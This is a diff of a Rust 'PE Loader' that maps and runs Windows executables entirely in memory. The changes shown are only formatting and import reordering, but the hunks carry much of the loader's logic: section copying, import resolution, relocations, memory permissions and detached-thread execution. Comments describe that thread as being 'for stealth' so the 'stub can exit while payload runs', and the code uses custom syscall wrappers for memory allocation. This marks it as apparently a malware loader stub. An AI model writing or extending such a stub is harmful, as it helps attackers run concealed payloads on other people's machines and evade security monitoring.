@@ -1,15 +1,15 @@
 // PE Loader
 // Loads and executes PE files entirely in memory
 
-use winapi::um::winnt::*;
-use winapi::um::memoryapi::*;
-use winapi::um::libloaderapi::*;
-use winapi::um::errhandlingapi::*;
-use winapi::um::processthreadsapi::*;
-use winapi::um::handleapi::*;
 use crate::syscalls::{sys_allocate_memory, sys_protect_memory};
-use std::ptr;
 use std::ffi::CString;
+use std::ptr;
+use winapi::um::errhandlingapi::*;
+use winapi::um::handleapi::*;
+use winapi::um::libloaderapi::*;
+use winapi::um::memoryapi::*;
+use winapi::um::processthreadsapi::*;
+use winapi::um::winnt::*;
 
 /// PE structure for in-memory loading
 #[repr(C)]
@@ -98,9 +98,10 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
     );
 
     // Step 5: Copy sections
-    let section_header_offset = pe_offset + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
+    let section_header_offset =
+        pe_offset + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
     let num_sections = (*nt_headers).FileHeader.NumberOfSections as usize;
-    
+
     for i in 0..num_sections {
         let section_offset = section_header_offset + (i * 40); // IMAGE_SECTION_HEADER is 40 bytes
         if section_offset + 40 > pe_data.len() {
@@ -116,7 +117,7 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
             let section_dest = final_base.add(virtual_address) as *mut u8;
             let section_src = pe_data.as_ptr().add(pointer_to_raw_data);
             let copy_size = size_of_raw_data.min(pe_data.len() - pointer_to_raw_data);
-            
+
             ptr::copy_nonoverlapping(section_src, section_dest, copy_size);
         }
     }
@@ -132,10 +133,10 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
 
     // Step 9: Calculate and call entry point
     let entry_point = final_base.add(entry_point_rva) as *const ();
-    
+
     // Check if DLL or EXE
     let characteristics = (*nt_headers).FileHeader.Characteristics;
-    
+
     if use_thread {
         // Execute in separate thread (for stealth - stub can exit while payload runs)
         if (characteristics & IMAGE_FILE_DLL) != 0 {
@@ -146,7 +147,7 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
                 lpv_reserved: *mut winapi::ctypes::c_void,
             ) -> i32;
             let dll_main: DllMain = std::mem::transmute(entry_point);
-            
+
             // Thread wrapper that calls DllMain with correct parameters
             extern "system" fn dll_main_wrapper(lp_param: *mut winapi::ctypes::c_void) -> u32 {
                 unsafe {
@@ -158,7 +159,7 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
                     0
                 }
             }
-            
+
             // Allocate space for parameters (base, entry_point)
             let param_size = std::mem::size_of::<(*mut winapi::ctypes::c_void, *const ())>();
             let params = VirtualAlloc(
@@ -167,16 +168,16 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
                 MEM_COMMIT | MEM_RESERVE,
                 PAGE_READWRITE,
             ) as *mut (*mut winapi::ctypes::c_void, *const ());
-            
+
             if params.is_null() {
                 // Fallback to direct execution
                 let _ = dll_main(final_base as *mut _, DLL_PROCESS_ATTACH, ptr::null_mut());
                 return Ok(0);
             }
-            
+
             (*params).0 = final_base as *mut winapi::ctypes::c_void;
             (*params).1 = entry_point;
-            
+
             let thread_handle = CreateThread(
                 ptr::null_mut(),
                 0,
@@ -185,14 +186,14 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
                 0,
                 ptr::null_mut(),
             );
-            
+
             if thread_handle.is_null() {
                 VirtualFree(params, 0, MEM_RELEASE);
                 // Fallback to direct execution
                 let _ = dll_main(final_base as *mut _, DLL_PROCESS_ATTACH, ptr::null_mut());
                 return Ok(0);
             }
-            
+
             // Don't wait - let thread run independently
             // Close handle so thread can continue after stub exits
             CloseHandle(thread_handle);
@@ -202,13 +203,12 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
             // EXE entry points typically take no parameters
             extern "system" fn exe_entry_wrapper(lp_param: *mut winapi::ctypes::c_void) -> u32 {
                 unsafe {
-                    let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(
-                        lp_param as *const ()
-                    );
+                    let entry_fn: extern "system" fn() -> u32 =
+                        std::mem::transmute(lp_param as *const ());
                     entry_fn()
                 }
             }
-            
+
             let thread_handle = CreateThread(
                 ptr::null_mut(),
                 0,
@@ -217,13 +217,13 @@ unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Resu
                 0,
                 ptr::null_mut(),
             );
-            
+
             if thread_handle.is_null() {
                 // Fallback to direct execution
                 let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(entry_point);
                 return Ok(entry_fn());
             }
-            
+
             // Don't wait - let thread run independently
             // Close handle so thread can continue after stub exits
             CloseHandle(thread_handle);
@@ -255,8 +255,9 @@ unsafe fn resolve_imports(
     nt_headers: *const IMAGE_NT_HEADERS64,
 ) -> Result<(), String> {
     let optional_header = &(*nt_headers).OptionalHeader;
-    let import_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize].VirtualAddress as usize;
-    
+    let import_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize]
+        .VirtualAddress as usize;
+
     if import_table_rva == 0 {
         return Ok(()); // No imports
     }
@@ -279,8 +280,8 @@ unsafe fn resolve_imports(
                 return Err("DLL name too long".to_string());
             }
         }
-        let dll_name = CString::new(dll_name_vec)
-            .map_err(|_| "Invalid DLL name encoding".to_string())?;
+        let dll_name =
+            CString::new(dll_name_vec).map_err(|_| "Invalid DLL name encoding".to_string())?;
 
         // Load library
         let module = LoadLibraryA(dll_name.as_ptr() as *const i8);
@@ -291,7 +292,8 @@ unsafe fn resolve_imports(
         }
 
         // Resolve functions
-        let mut thunk_data = image_base.add((*import_desc).u.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
+        let mut thunk_data =
+            image_base.add((*import_desc).u.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
         let mut iat = image_base.add((*import_desc).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
         while (*thunk_data).u1.AddressOfData != 0 {
@@ -304,7 +306,8 @@ unsafe fn resolve_imports(
                 (*iat).u1.Function = func_addr as u64;
             } else {
                 // Import by name
-                let import_by_name = image_base.add((*thunk_data).u1.AddressOfData as usize) as *const IMAGE_IMPORT_BY_NAME;
+                let import_by_name = image_base.add((*thunk_data).u1.AddressOfData as usize)
+                    as *const IMAGE_IMPORT_BY_NAME;
                 // Create CString from null-terminated string
                 let mut func_name_vec = Vec::new();
                 let mut offset = 0;
@@ -343,8 +346,9 @@ unsafe fn apply_relocations(
     preferred_base: usize,
 ) -> Result<(), String> {
     let optional_header = &(*nt_headers).OptionalHeader;
-    let reloc_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize].VirtualAddress as usize;
-    
+    let reloc_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize]
+        .VirtualAddress as usize;
+
     if reloc_table_rva == 0 {
         return Ok(()); // No relocations
     }
@@ -368,15 +372,18 @@ unsafe fn apply_relocations(
             let offset = (entry & 0x0FFF) as usize;
 
             if reloc_type == IMAGE_REL_BASED_DIR64 {
-                let reloc_addr = image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u64;
+                let reloc_addr =
+                    image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u64;
                 *reloc_addr = (*reloc_addr).wrapping_add(delta as u64);
             } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
-                let reloc_addr = image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u32;
+                let reloc_addr =
+                    image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u32;
                 *reloc_addr = (*reloc_addr).wrapping_add(delta as u32);
             }
         }
 
-        reloc_block = (reloc_block as *const u8).add((*reloc_block).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
+        reloc_block = (reloc_block as *const u8).add((*reloc_block).SizeOfBlock as usize)
+            as *const IMAGE_BASE_RELOCATION;
     }
 
     Ok(())
@@ -389,7 +396,8 @@ unsafe fn set_section_permissions(
 ) -> Result<(), String> {
     let section_header_offset = 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
     let num_sections = (*nt_headers).FileHeader.NumberOfSections as usize;
-    let section_headers = (nt_headers as *const u8).add(section_header_offset) as *const IMAGE_SECTION_HEADER;
+    let section_headers =
+        (nt_headers as *const u8).add(section_header_offset) as *const IMAGE_SECTION_HEADER;
 
     for i in 0..num_sections {
         let section = section_headers.add(i);
